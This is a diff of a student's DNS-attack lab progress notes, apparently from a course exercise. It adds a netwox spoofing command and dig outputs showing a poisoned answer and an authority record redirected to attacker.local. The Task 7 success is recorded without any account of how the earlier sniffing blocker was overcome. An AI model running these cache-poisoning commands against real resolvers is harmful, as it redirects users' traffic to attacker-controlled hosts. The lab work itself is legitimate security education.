@@ -1,7 +1,7 @@
 # Lab 1: Local DNS Attack - Progress Summary
 
 **Date**: February 17, 2026  
-**Status**: Tasks 1-5 Complete, Tasks 6-7 Pending
+**Status**: Tasks 1-7 Complete
 
 ---
 
@@ -119,19 +119,42 @@ dig www.example.net
 
 **Result**: ✅ Spoof successful (with Promiscuous Mode: Allow All)
 
+### Task 6: DNS Cache Poisoning ✅
+**Attacker VM Command (NAT network on enp0s8):**
+```bash
+sudo netwox 105 -h "p4g77.example.net" -H 1.2.3.4 -a "ns.example.net" \
+	-A 192.168.56.104 -d enp0s8 -T 600 \
+	-f "udp and src host 10.10.0.9 and dst port 53" -s raw
+```
+
+**User VM Query:**
+```bash
+dig p4g77.example.net
+# Shows: p4g77.example.net. IN A 1.2.3.4
+```
+
+**Result**: ✅ Poisoned cache for a fresh subdomain
+
 ---
 
-## Pending Tasks
+### Task 7: Authority-Section Poisoning (Scapy) ✅
+**Script**: `/home/seed/poison_auth.py` (Python 3.5 compatible; no f-strings)
 
-### Task 6: DNS Cache Poisoning
-**Goal**: Poison the DNS server's cache so it serves fake answers for 10+ minutes  
-**Status**: ⚠️ Requires sniffing DNS server's **outbound** queries (goes via NAT adapter)  
-**Next Step**: Use `tcpdump -i enp0s8` to verify attacker can see outbound queries
+**User VM Query:**
+```bash
+dig z9k11.example.net
+# Shows: z9k11.example.net. IN A 1.2.3.4
+# AUTHORITY: example.net. IN NS attacker.local.
+```
 
-### Task 7: Authority-Section Poisoning (Scapy)
-**Goal**: Poison cache to redirect entire `example.net` domain to `attacker.local`  
-**Status**: ⚠️ Same sniffing blocker  
-**Script**: `/home/seed/poison_auth.py` (created, but spoof not winning race)  
+**DNS Server Cache Check:**
+```bash
+sudo rndc dumpdb -cache
+sudo cat /var/cache/bind/dump.db | grep -A 3 "example.net.*NS"
+# Shows: example.net. NS attacker.local.
+```
+
+**Result**: ✅ Authority section poisoned
 
 ---
 
@@ -145,21 +168,6 @@ dig www.example.net
 
 ---
 
-## Commands to Resume Tasks 6-7
-
-**Verify outbound sniffing** (Attacker VM):
-```bash
-sudo tcpdump -i enp0s8 -n "udp and src 192.168.56.104 and dst port 53"
-# Then trigger: dig random_name.example.net on User VM
-```
-
-**If packets show**, adjust netwox/Scapy to use `enp0s8` interface:
-```bash
-sudo netwox 105 ... -d enp0s8 ...  # Change from enp0s3
-```
-
----
-
 ## Screenshots Captured (for report)
 
 - [x] Task 1: User VM using local DNS (SERVER: 192.168.56.104#53)
@@ -167,9 +175,9 @@ sudo netwox 105 ... -d enp0s8 ...  # Change from enp0s3
 - [x] Task 3: Forward + Reverse lookups working
 - [x] Task 4: /etc/hosts override
 - [x] Task 5: Direct spoof (1.2.3.4 in answer)
-- [ ] Task 6: Cache dump showing poisoned NS
-- [ ] Task 7: Authority section pointing to attacker.local
+- [x] Task 6: Poisoned subdomain answer (1.2.3.4)
+- [x] Task 7: Authority section pointing to attacker.local
 
 ---
 
-**Next Session**: Focus on Task 6-7 outbound query sniffing via enp0s8 adapter.
+**Next Session**: Wrap report and compile screenshots.
